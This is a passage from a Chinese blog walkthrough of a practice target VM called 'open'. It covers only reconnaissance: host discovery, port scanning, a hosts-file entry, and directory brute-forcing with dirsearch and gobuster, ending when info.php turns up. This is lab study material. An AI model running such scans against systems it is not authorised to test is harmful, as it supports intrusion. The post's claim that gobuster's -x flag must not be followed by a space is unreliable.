@@ -1,0 +1,654 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>群友靶机--open - X8@0E的博客</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="一、信息收集扫靶机IP–arp-scan -l  扫靶机IP开放的端口—nmap  先看80端口 页面一开始访问不出来，想到要域名解析1vim &#x2F;etc&#x2F;hosts   域名解析添加完之后80端口页面访问成功  扫靶机目录 1dirsearch -u http:&#x2F;&#x2F;open.dsz&#x2F;   1dirsearch -u http:&#x2F;&#x2F;192.168.56.4&#x2F;   这就有点玄学了，域名可以扫出文件而I">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机--open">
+<meta property="og:url" content="http://example.com/2025/08/05/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--open/index.html">
+<meta property="og:site_name" content="X8@0E的博客">
+<meta property="og:description" content="一、信息收集扫靶机IP–arp-scan -l  扫靶机IP开放的端口—nmap  先看80端口 页面一开始访问不出来，想到要域名解析1vim &#x2F;etc&#x2F;hosts   域名解析添加完之后80端口页面访问成功  扫靶机目录 1dirsearch -u http:&#x2F;&#x2F;open.dsz&#x2F;   1dirsearch -u http:&#x2F;&#x2F;192.168.56.4&#x2F;   这就有点玄学了，域名可以扫出文件而I">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805000249410.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805000333834.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805000701710.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805000801033.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805000950445.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805001219661.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805004507653.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805004550869.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805012711659.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805004857082.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805005405502.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805005648637.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805181548184.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805183257010.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805181306712.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805182010492.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805182051783.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805182247855.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805184724454.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805190546069.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805194607759.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805195221842.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805200529964.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805200854000.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805202805297.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805202959231.png">
+<meta property="article:published_time" content="2025-08-04T16:00:09.549Z">
+<meta property="article:modified_time" content="2025-08-11T12:32:43.825Z">
+<meta property="article:author" content="X8@0E">
+<meta property="article:tag" content="url截断">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250805000249410.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1761989925396">
+
+<link rel="stylesheet" href="/css/style.css?v=1761989925396">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1761989925396">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1761989925397"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="X8@0E"><img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="X8@0E">
+            <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E" alt="X8@0E">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>43</div>
+        <div><span>标签</span>77</div>
+        <div><span>分类</span>14</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-douban-fill"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1761989925397"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://blog.csdn.net/2301_81325456/article/details/147025965"
+			target="_blank"
+			mdui-tooltip="{content: 'CSDN'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/NSSCTF/">NSSCTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnhub/">Vulnhub</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnvm靶机复现/">Vulnvm靶机复现</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-信息收集/">ctfshow-web-信息收集</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-命令执行/">ctfshow-web-命令执行</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件上传/">ctfshow-web-文件上传</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件包含/">ctfshow-web-文件包含</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-爆破/">ctfshow-web-爆破</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/sql注入/">sql注入</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulhub/">vulhub</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulnhub/">vulnhub</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/群友靶机/">群友靶机</a>
+          <span class="category-list-count">15</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/自制靶机/">自制靶机</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/1Panel/" style="font-size: 10px;">1Panel</a> <a href="/tags/3%E4%B8%AA%E7%82%B9/" style="font-size: 10px;">3个点</a> <a href="/tags/Argon2Cracker/" style="font-size: 10px;">Argon2Cracker</a> <a href="/tags/Cookie-GLOBALS/" style="font-size: 10px;">Cookie--GLOBALS</a> <a href="/tags/Cypher%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">Cypher注入</a> <a href="/tags/DC/" style="font-size: 15px;">DC</a> <a href="/tags/GIF%E7%BB%95%E8%BF%87/" style="font-size: 10px;">GIF绕过</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/JoomScan/" style="font-size: 10px;">JoomScan</a> <a href="/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/" style="font-size: 10px;">LFI到RCE(open函数)</a> <a href="/tags/NSSCTF/" style="font-size: 15px;">NSSCTF</a> <a href="/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Nginx解析漏洞</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/RUNPATH/" style="font-size: 10px;">RUNPATH</a> <a href="/tags/Rabbit/" style="font-size: 10px;">Rabbit</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Vulnhub/" style="font-size: 15px;">Vulnhub</a> <a href="/tags/Vulnvm/" style="font-size: 10px;">Vulnvm</a> <a href="/tags/WAF/" style="font-size: 10px;">WAF</a> <a href="/tags/WPA-01-cap/" style="font-size: 10px;">WPA-01.cap</a> <a href="/tags/aircrack-ng/" style="font-size: 10px;">aircrack-ng</a> <a href="/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">basic认证爆破</a> <a href="/tags/cgi%E6%96%87%E4%BB%B6/" style="font-size: 10px;">cgi文件</a> <a href="/tags/ctfshow/" style="font-size: 20px;">ctfshow</a> <a href="/tags/dirtycow/" style="font-size: 10px;">dirtycow</a> <a href="/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/" style="font-size: 10px;">docker交互式shell</a> <a href="/tags/drupal/" style="font-size: 10px;">drupal</a> <a href="/tags/ffuf/" style="font-size: 10px;">ffuf</a> <a href="/tags/flask/" style="font-size: 10px;">flask</a> <a href="/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/" style="font-size: 10px;">fork解决断连</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/ghfs/" style="font-size: 10px;">ghfs</a> <a href="/tags/ldd/" style="font-size: 10px;">ldd</a> <a href="/tags/les-sh/" style="font-size: 10px;">les.sh</a> <a href="/tags/linpeas-sh/" style="font-size: 10px;">linpeas.sh</a> <a href="/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/" style="font-size: 10px;">lsattr--查看文件扩展属性</a> <a href="/tags/motto/" style="font-size: 10px;">motto</a> <a href="/tags/msfvenom/" style="font-size: 15px;">msfvenom</a> <a href="/tags/mysql-old-password/" style="font-size: 10px;">mysql_old_password</a> <a href="/tags/nikto/" style="font-size: 10px;">nikto</a> <a href="/tags/nohup/" style="font-size: 10px;">nohup</a> <a href="/tags/php%E6%8F%90%E6%9D%83root/" style="font-size: 10px;">php提权root</a> <a href="/tags/poc/" style="font-size: 10px;">poc</a> <a href="/tags/put%E6%96%B9%E6%B3%95/" style="font-size: 10px;">put方法</a> <a href="/tags/python3-5/" style="font-size: 10px;">python3.5</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/readelf/" style="font-size: 10px;">readelf</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql二次注入</a> <a href="/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" style="font-size: 10px;">ssh弱口令爆破</a> <a href="/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">ssh秘钥生成连接</a> <a href="/tags/stegseek/" style="font-size: 10px;">stegseek</a> <a href="/tags/suForce/" style="font-size: 10px;">suForce</a> <a href="/tags/url%E6%88%AA%E6%96%AD/" style="font-size: 10px;">url截断</a> <a href="/tags/vite/" style="font-size: 10px;">vite</a> <a href="/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">web命令执行</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">web文件上传</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">web文件包含</a> <a href="/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">web源码泄露</a> <a href="/tags/web%E7%88%86%E7%A0%B4/" style="font-size: 10px;">web爆破</a> <a href="/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">x-forwarded-for的ip欺骗</a> <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/" style="font-size: 10px;">任意文件读取漏洞(CVE-2025-30208)</a> <a href="/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/" style="font-size: 10px;">凯撒密码</a> <a href="/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/" style="font-size: 10px;">后面加.jpg后缀</a> <a href="/tags/%E5%9F%9F%E6%8E%A7/" style="font-size: 10px;">域控</a> <a href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">密码爆破</a> <a href="/tags/%E6%8F%90%E6%9D%83-env-reset/" style="font-size: 10px;">提权!env_reset</a> <a href="/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">插件漏洞</a> <a href="/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">日志注入+ua添加木马</a> <a href="/tags/%E6%AD%A3%E5%90%91shell/" style="font-size: 10px;">正向shell</a> <a href="/tags/%E7%8A%B6%E6%80%81%E7%A0%81/" style="font-size: 10px;">状态码</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" style="font-size: 10px;">环境变量</a> <a href="/tags/%E7%A9%BA%E6%A0%BC/" style="font-size: 10px;">空格</a> <a href="/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/" style="font-size: 10px;">维吉尼亚密码</a> <a href="/tags/%E8%9A%81%E5%89%91/" style="font-size: 10px;">蚁剑</a> <a href="/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">越界读取</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(77);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">43</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/20/Crypto/">Crypto</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/11/%E6%B5%81%E9%87%8F%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/">流量分析恶意攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/09/hackableII/">hackablell</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/07/Me-and-My-Girlfriend-1/">Me-and-My-Girlfriend-1</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="" target="_blank" >
+                    <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></img>
+                    <p>X8@0E</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2025 X8@0E
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://th.bing.com/th/id/R.b5b5ae199c86ae436c921766a1443ff6?rik=mxVbgH2EGf%2flkg&riu=http%3a%2f%2fimg.netbian.com%2ffile%2f2023%2f0922%2f193127wXFyM.jpg&ehk=HeN3zNYv7do5T6h9L30npQtAM12aiyLEfzwZwtgspOo%3d&risl=&pid=ImgRaw&r=0" alt="群友靶机--open" loading="lazy">
+            <h1>群友靶机--open</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2025年08月05日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><p>扫靶机IP–arp-scan -l</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805000249410.png" alt="image-20250805000249410" data-caption="image-20250805000249410" loading="lazy"></p>
+<p>扫靶机IP开放的端口—nmap</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805000333834.png" alt="image-20250805000333834" data-caption="image-20250805000333834" loading="lazy"></p>
+<p>先看80端口</p>
+<h2 id="页面一开始访问不出来，想到要域名解析"><a href="#页面一开始访问不出来，想到要域名解析" class="headerlink" title="页面一开始访问不出来，想到要域名解析"></a>页面一开始访问不出来，想到要域名解析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805000701710.png" alt="image-20250805000701710" data-caption="image-20250805000701710" loading="lazy"></p>
+<p>域名解析添加完之后80端口页面访问成功</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805000801033.png" alt="image-20250805000801033" data-caption="image-20250805000801033" loading="lazy"></p>
+<p>扫靶机目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://open.dsz/</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805000950445.png" alt="image-20250805000950445" data-caption="image-20250805000950445" loading="lazy"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.4/</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805001219661.png" alt="image-20250805001219661" data-caption="image-20250805001219661" loading="lazy"></p>
+<h2 id="这就有点玄学了，域名可以扫出文件而IP却扫不出"><a href="#这就有点玄学了，域名可以扫出文件而IP却扫不出" class="headerlink" title="这就有点玄学了，域名可以扫出文件而IP却扫不出"></a>这就有点玄学了，域名可以扫出文件而IP却扫不出</h2><p><strong>原因可能是Web 服务器的虚拟主机配置</strong>：</p>
+<ul>
+<li><p>大多数 Web 服务器（如 Apache 或 Nginx）支持 <strong>基于域名的虚拟主机</strong>。这意味着服务器根据 HTTP 请求中的 <code>Host</code> 头字段（即域名）来决定提供哪个网站的内容。</p>
+</li>
+<li><p>当您在浏览器或工具中访问 <code>open.dsz</code> 时：</p>
+<ul>
+<li>请求包含 <code>Host: open.dsz</code> 头。</li>
+<li>Web 服务器识别该域名，并返回与该虚拟主机对应的内容（例如包含 <code>info.php</code> 的目录）。</li>
+</ul>
+</li>
+<li><p>当您直接扫描 IP 地址 <code>192.168.56.4</code> 时：</p>
+<ul>
+<li>请求的 <code>Host</code> 头通常是 IP 地址（如 <code>Host: 192.168.56.4</code>）或为空。</li>
+<li>Web 服务器可能：<ul>
+<li>返回一个 <strong>默认虚拟主机</strong> 的内容（该主机可能没有 <code>info.php</code>）。</li>
+<li>返回一个 <strong>空站点</strong> 或 <strong>错误页面</strong>。</li>
+<li>拒绝提供敏感目录（如某些服务器会屏蔽对 IP 的直接访问）。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>/etc/hosts</code> 仅影响 <strong>本地 DNS 解析</strong>，确保 <code>open.dsz</code> 解析到 <code>192.168.56.4</code>。它不改变 HTTP 请求中的 <code>Host</code> 头。</p>
+</li>
+</ul>
+<p>如何验证</p>
+<p><strong>使用 <code>curl</code> 测试响应差异</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试域名访问（应返回 info.php 的内容）</span></span><br><span class="line">curl -v http://open.dsz/info.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试 IP 访问（可能返回错误或空内容）</span></span><br><span class="line">curl -v http://192.168.56.4/info.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>检查输出中的 <strong>HTTP 响应码</strong>（如 200 OK 或 404 Not Found）和内容。</li>
+<li>如果 IP 访问返回 <code>404</code>，而域名访问返回 <code>200</code>，则确认是虚拟主机问题。</li>
+</ul>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805004507653.png" alt="image-20250805004507653" data-caption="image-20250805004507653" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805004550869.png" alt="image-20250805004550869" data-caption="image-20250805004550869" loading="lazy"></p>
+<h2 id="另外一种扫目录的方式—gobuster-推荐"><a href="#另外一种扫目录的方式—gobuster-推荐" class="headerlink" title="另外一种扫目录的方式—gobuster(推荐)"></a>另外一种扫目录的方式—gobuster(推荐)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://open.dsz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x.php,.html,.txt</span><br></pre></td></tr></table></figure>
+
+<p><code>-x.php,.html,.txt</code> 是目录扫描工具中的<strong>扩展名参数</strong>，它直接影响扫描的深度和效果。以下是详细解释：</p>
+<p>作用原理</p>
+<ol>
+<li><strong>基础扫描模式</strong>：<ul>
+<li>默认只扫描目录：<code>http://target.com/&#123;单词&#125;</code></li>
+<li>示例：扫描 <code>http://open.dsz/admin</code>（不检查文件）</li>
+</ul>
+</li>
+<li><strong>添加 <code>-x</code> 后的增强模式</strong>：<ul>
+<li>同时扫描文件：<code>http://target.com/&#123;单词&#125;&#123;扩展名&#125;</code></li>
+<li>示例：扫描<ul>
+<li><code>http://open.dsz/info.php</code></li>
+<li><code>http://open.dsz/backup.html</code></li>
+<li><code>http://open.dsz/notes.txt</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>为什么对发现 <code>info.php</code> 至关重要</p>
+<table>
+<thead>
+<tr>
+<th align="left">场景</th>
+<th align="left">扫描目标</th>
+<th align="left">能否发现 info.php</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>不加 <code>-x.php</code></strong></td>
+<td align="left"><code>http://open.dsz/info</code></td>
+<td align="left">❌ 仅测试目录</td>
+</tr>
+<tr>
+<td align="left"><strong>添加 <code>-x.php</code></strong></td>
+<td align="left"><code>http://open.dsz/info.php</code></td>
+<td align="left">✅ 直接测试文件</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p><strong>扩展名问题</strong>：<code>-x</code> 参数后<strong>不能有空格</strong>（确保是 <code>-x.php,.html,.txt</code> 而非 <code>-x .php,.html,.txt</code>）</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- -x .php,.html,.txt   # 错误（空格导致 .php 被忽略）</span></span><br><span class="line"><span class="addition">+ -x.php,.html,.txt    # 正确</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250805012711659.png" alt="image-20250805012711659" data-caption="image-20250805012711659" loading="lazy"></p>
+<p>根据上面的目录扫描可知有info.php和info.txt，分别访问一下</p>
